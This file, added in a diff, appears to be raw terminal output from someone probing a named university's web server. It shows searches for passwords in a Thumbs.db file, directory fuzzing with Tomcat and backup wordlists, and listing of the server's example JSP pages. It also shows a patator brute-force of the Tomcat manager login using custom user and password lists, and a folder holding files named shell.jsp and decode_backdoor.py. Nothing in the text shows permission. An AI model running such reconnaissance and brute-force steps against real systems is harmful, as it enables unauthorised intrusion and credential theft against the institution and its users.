@@ -1,0 +1,218 @@
+─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Salida]
+└──╼ $strings Thumbs.db | grep -i -E "password|jdbc|mysql|oracle|sqlserver|connection|user|pass"
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Salida]
+└──╼ $hexdump -C Thumbs.db | head -100
+00000000  d0 cf 11 e0 a1 b1 1a e1  00 00 00 00 00 00 00 00  |................|
+00000010  00 00 00 00 00 00 00 00  3e 00 03 00 fe ff 09 00  |........>.......|
+00000020  06 00 00 00 00 00 00 00  00 00 00 00 03 00 00 00  |................|
+00000030  01 00 00 00 00 00 00 00  00 10 00 00 02 00 00 00  |................|
+00000040  03 00 00 00 fe ff ff ff  00 00 00 00 00 00 00 00  |................|
+00000050  75 00 00 00 f7 00 00 00  ff ff ff ff ff ff ff ff  |u...............|
+00000060  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
+*
+00000200  fd ff ff ff 38 00 00 00  ba 00 00 00 17 00 00 00  |....8...........|
+00000210  05 00 00 00 06 00 00 00  07 00 00 00 08 00 00 00  |................|
+00000220  09 00 00 00 0a 00 00 00  0b 00 00 00 0c 00 00 00  |................|
+00000230  0d 00 00 00 0e 00 00 00  0f 00 00 00 10 00 00 00  |................|
+00000240  11 00 00 00 12 00 00 00  13 00 00 00 14 00 00 00  |................|
+00000250  15 00 00 00 16 00 00 00  b6 00 00 00 18 00 00 00  |................|
+00000260  19 00 00 00 1a 00 00 00  1b 00 00 00 1c 00 00 00  |................|
+00000270  1d 00 00 00 4d 00 00 00  1f 00 00 00 20 00 00 00  |....M....... ...|
+00000280  21 00 00 00 22 00 00 00  23 00 00 00 24 00 00 00  |!..."...#...$...|
+00000290  25 00 00 00 26 00 00 00  27 00 00 00 28 00 00 00  |%...&...'...(...|
+000002a0  29 00 00 00 2a 00 00 00  2b 00 00 00 2c 00 00 00  |)...*...+...,...|
+000002b0  2d 00 00 00 2e 00 00 00  2f 00 00 00 30 00 00 00  |-......./...0...|
+000002c0  31 00 00 00 32 00 00 00  33 00 00 00 fe ff ff ff  |1...2...3.......|
+000002d0  35 00 00 00 36 00 00 00  37 00 00 00 5d 00 00 00  |5...6...7...]...|
+000002e0  74 00 00 00 3a 00 00 00  3b 00 00 00 3c 00 00 00  |t...:...;...<...|
+000002f0  3d 00 00 00 3e 00 00 00  3f 00 00 00 40 00 00 00  |=...>...?...@...|
+00000300  41 00 00 00 42 00 00 00  43 00 00 00 44 00 00 00  |A...B...C...D...|
+00000310  45 00 00 00 46 00 00 00  47 00 00 00 48 00 00 00  |E...F...G...H...|
+00000320  49 00 00 00 4a 00 00 00  4b 00 00 00 4c 00 00 00  |I...J...K...L...|
+00000330  fe ff ff ff 4e 00 00 00  4f 00 00 00 50 00 00 00  |....N...O...P...|
+00000340  51 00 00 00 b7 00 00 00  53 00 00 00 54 00 00 00  |Q.......S...T...|
+00000350  55 00 00 00 56 00 00 00  57 00 00 00 58 00 00 00  |U...V...W...X...|
+00000360  59 00 00 00 5a 00 00 00  5b 00 00 00 5c 00 00 00  |Y...Z...[...\...|
+00000370  fe ff ff ff 5e 00 00 00  5f 00 00 00 60 00 00 00  |....^..._...`...|
+00000380  61 00 00 00 62 00 00 00  63 00 00 00 64 00 00 00  |a...b...c...d...|
+00000390  65 00 00 00 66 00 00 00  67 00 00 00 68 00 00 00  |e...f...g...h...|
+000003a0  69 00 00 00 6a 00 00 00  6b 00 00 00 6c 00 00 00  |i...j...k...l...|
+000003b0  6d 00 00 00 6e 00 00 00  6f 00 00 00 70 00 00 00  |m...n...o...p...|
+000003c0  71 00 00 00 fe ff ff ff  73 00 00 00 a0 00 00 00  |q.......s.......|
+000003d0  b8 00 00 00 fd ff ff ff  77 00 00 00 78 00 00 00  |........w...x...|
+000003e0  79 00 00 00 7a 00 00 00  7b 00 00 00 7c 00 00 00  |y...z...{...|...|
+000003f0  7d 00 00 00 7e 00 00 00  7f 00 00 00 80 00 00 00  |}...~...........|
+00000400  52 00 6f 00 6f 00 74 00  20 00 45 00 6e 00 74 00  |R.o.o.t. .E.n.t.|
+00000410  72 00 79 00 00 00 00 00  00 00 00 00 00 00 00 00  |r.y.............|
+00000420  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000440  16 00 05 00 ff ff ff ff  ff ff ff ff 11 00 00 00  |................|
+00000450  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000460  00 00 00 00 00 00 00 00  00 00 00 00 70 f5 45 93  |............p.E.|
+00000470  8f 17 dc 01 03 00 00 00  40 4d 00 00 00 00 00 00  |........@M......|
+00000480  32 00 35 00 36 00 5f 00  39 00 32 00 36 00 30 00  |2.5.6._.9.2.6.0.|
+00000490  35 00 64 00 38 00 64 00  31 00 34 00 31 00 64 00  |5.d.8.d.1.4.1.d.|
+000004a0  32 00 32 00 34 00 64 00  00 00 00 00 00 00 00 00  |2.2.4.d.........|
+000004b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000004c0  2a 00 02 00 ff ff ff ff  10 00 00 00 ff ff ff ff  |*...............|
+000004d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+000004f0  00 00 00 00 04 00 00 00  ab 27 00 00 00 00 00 00  |.........'......|
+00000500  32 00 35 00 36 00 5f 00  34 00 35 00 65 00 30 00  |2.5.6._.4.5.e.0.|
+00000510  39 00 30 00 37 00 31 00  31 00 64 00 33 00 33 00  |9.0.7.1.1.d.3.3.|
+00000520  65 00 32 00 66 00 00 00  00 00 00 00 00 00 00 00  |e.2.f...........|
+00000530  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000540  28 00 02 01 ff ff ff ff  09 00 00 00 ff ff ff ff  |(...............|
+00000550  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000570  00 00 00 00 00 00 00 00  12 0f 00 00 00 00 00 00  |................|
+00000580  32 00 35 00 36 00 5f 00  65 00 33 00 32 00 39 00  |2.5.6._.e.3.2.9.|
+00000590  65 00 35 00 32 00 33 00  32 00 30 00 38 00 38 00  |e.5.2.3.2.0.8.8.|
+000005a0  34 00 36 00 35 00 39 00  00 00 00 00 00 00 00 00  |4.6.5.9.........|
+000005b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000005c0  2a 00 02 00 ff ff ff ff  ff ff ff ff ff ff ff ff  |*...............|
+000005d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+000005f0  00 00 00 00 34 00 00 00  7b 31 00 00 00 00 00 00  |....4...{1......|
+00000600  01 00 00 00 02 00 00 00  03 00 00 00 04 00 00 00  |................|
+00000610  05 00 00 00 06 00 00 00  07 00 00 00 08 00 00 00  |................|
+00000620  09 00 00 00 0a 00 00 00  0b 00 00 00 0c 00 00 00  |................|
+00000630  0d 00 00 00 0e 00 00 00  0f 00 00 00 10 00 00 00  |................|
+00000640  11 00 00 00 12 00 00 00  13 00 00 00 14 00 00 00  |................|
+00000650  15 00 00 00 16 00 00 00  17 00 00 00 18 00 00 00  |................|
+00000660  19 00 00 00 1a 00 00 00  1b 00 00 00 1c 00 00 00  |................|
+00000670  1d 00 00 00 1e 00 00 00  1f 00 00 00 20 00 00 00  |............ ...|
+00000680  21 00 00 00 22 00 00 00  23 00 00 00 24 00 00 00  |!..."...#...$...|
+00000690  25 00 00 00 26 00 00 00  27 00 00 00 28 00 00 00  |%...&...'...(...|
+000006a0  29 00 00 00 2a 00 00 00  2b 00 00 00 2c 00 00 00  |)...*...+...,...|
+000006b0  2d 00 00 00 2e 00 00 00  2f 00 00 00 30 00 00 00  |-......./...0...|
+000006c0  31 00 00 00 32 00 00 00  33 00 00 00 34 00 00 00  |1...2...3...4...|
+000006d0  35 00 00 00 36 00 00 00  37 00 00 00 38 00 00 00  |5...6...7...8...|
+000006e0  39 00 00 00 3a 00 00 00  3b 00 00 00 3c 00 00 00  |9...:...;...<...|
+000006f0  fe ff ff ff 3f 00 00 00  3d 00 00 00 40 00 00 00  |....?...=...@...|
+00000700  41 00 00 00 42 00 00 00  43 00 00 00 44 00 00 00  |A...B...C...D...|
+00000710  45 00 00 00 46 00 00 00  47 00 00 00 48 00 00 00  |E...F...G...H...|
+00000720  49 00 00 00 4a 00 00 00  4b 00 00 00 4c 00 00 00  |I...J...K...L...|
+00000730  4d 00 00 00 4e 00 00 00  4f 00 00 00 50 00 00 00  |M...N...O...P...|
+00000740  51 00 00 00 52 00 00 00  53 00 00 00 54 00 00 00  |Q...R...S...T...|
+00000750  55 00 00 00 56 00 00 00  57 00 00 00 58 00 00 00  |U...V...W...X...|
+00000760  59 00 00 00 5a 00 00 00  5b 00 00 00 5c 00 00 00  |Y...Z...[...\...|
+00000770  5d 00 00 00 5e 00 00 00  5f 00 00 00 60 00 00 00  |]...^..._...`...|
+00000780  fe ff ff ff 62 00 00 00  63 00 00 00 64 00 00 00  |....b...c...d...|
+00000790  65 00 00 00 66 00 00 00  67 00 00 00 68 00 00 00  |e...f...g...h...|
+000007a0  69 00 00 00 6a 00 00 00  6b 00 00 00 6c 00 00 00  |i...j...k...l...|
+000007b0  6d 00 00 00 6e 00 00 00  6f 00 00 00 fe ff ff ff  |m...n...o.......|
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Salida]
+└──╼ $strings Thumbs.db | grep -E "jdbc:.*://"
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Salida]
+└──╼ $
+
+
+ :: Method           : GET
+ :: URL              : https://sito.utslp.edu.mx/FUZZ
+ :: Wordlist         : FUZZ: /home/marcos_os/Desktop/ProyectoSito/NuevoComienzo/directorios/tomcat_specific.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,302
+________________________________________________
+
+:: Progress: [11/11] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [11/11] :: Job [1/1] :: 26 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+
+
+ation: [0:00:28] :: :: Progress: [3588/13842] :: Job [1/1] :: 417 req/sec :: Duration: [0:00:28] :: :: Progress: [3652/13842] :: Job [1/1] :: 561 req/sec :: Duration: [0:00:28] :: default.jsp             [Status: 200, Size: 22038, Words: 2853, Lines: 407, Duration: 16ms]
+
+─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $curl -k "https://sito.utslp.edu.mx/examples/jsp/" | grep -o 'href="[^"]*\.jsp"' | cut -d'"' -f2
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 16658  100 16658    0     0   3146      0  0:00:05  0:00:05 --:--:--  3481
+jsp2/el/basic-arithmetic.jsp
+jsp2/el/basic-arithmetic.jsp
+jsp2/el/basic-comparisons.jsp
+jsp2/el/basic-comparisons.jsp
+jsp2/simpletag/hello.jsp
+jsp2/simpletag/hello.jsp
+jsp2/simpletag/repeat.jsp
+jsp2/simpletag/repeat.jsp
+jsp2/simpletag/book.jsp
+jsp2/simpletag/book.jsp
+jsp2/tagfiles/hello.jsp
+jsp2/tagfiles/hello.jsp
+jsp2/tagfiles/panel.jsp
+jsp2/tagfiles/panel.jsp
+jsp2/tagfiles/products.jsp
+jsp2/tagfiles/products.jsp
+jsp2/jspattribute/jspattribute.jsp
+jsp2/jspattribute/jspattribute.jsp
+jsp2/jspattribute/shuffle.jsp
+jsp2/jspattribute/shuffle.jsp
+jsp2/misc/dynamicattrs.jsp
+jsp2/misc/dynamicattrs.jsp
+jsp2/misc/config.jsp
+jsp2/misc/config.jsp
+num/numguess.jsp
+num/numguess.jsp
+dates/date.jsp
+dates/date.jsp
+snp/snoop.jsp
+snp/snoop.jsp
+include/include.jsp
+include/include.jsp
+forward/forward.jsp
+forward/forward.jsp
+plugin/plugin.jsp
+plugin/plugin.jsp
+jsptoserv/jsptoservlet.jsp
+jsptoserv/jsptoservlet.jsp
+simpletag/foo.jsp
+simpletag/foo.jsp
+xml/xml.jsp
+xml/xml.jsp
+tagplugin/if.jsp
+tagplugin/if.jsp
+tagplugin/foreach.jsp
+tagplugin/foreach.jsp
+tagplugin/choose.jsp
+tagplugin/choose.jsp
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $patator http_fuzz url=https://sito.utslp.edu.mx/manager/html method=GET auth_type=basic user_pass=FILE0:FILE1 0=custom_users.txt 1=custom_pass.txt -x ignore:code=401
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+12:12:49 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 12:12 CST
+12:12:49 patator    INFO -                                                                              
+12:12:49 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+12:12:49 patator    INFO - -----------------------------------------------------------------------------
+12:12:49 patator    INFO - Hits/Done/Skip/Fail/Size: 0/0/0/0/0, Avg: 0 r/s, Time: 0h 0m 0s
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $curl -k -I "https://sito.utslp.edu.mx/manager/html" | grep -i set-cookie
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:--  0:00:05 --:--:--     0
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Curls]
+└──╼ $ls
+CurlsP2.txt  Curls.txt  decode_backdoor.py  shell.jsp
+
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://sito.utslp.edu.mx/FUZZ
+ :: Wordlist         : FUZZ: /home/marcos_os/Desktop/ProyectoSito/NuevoComienzo/directorios/backup_patterns.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $
+
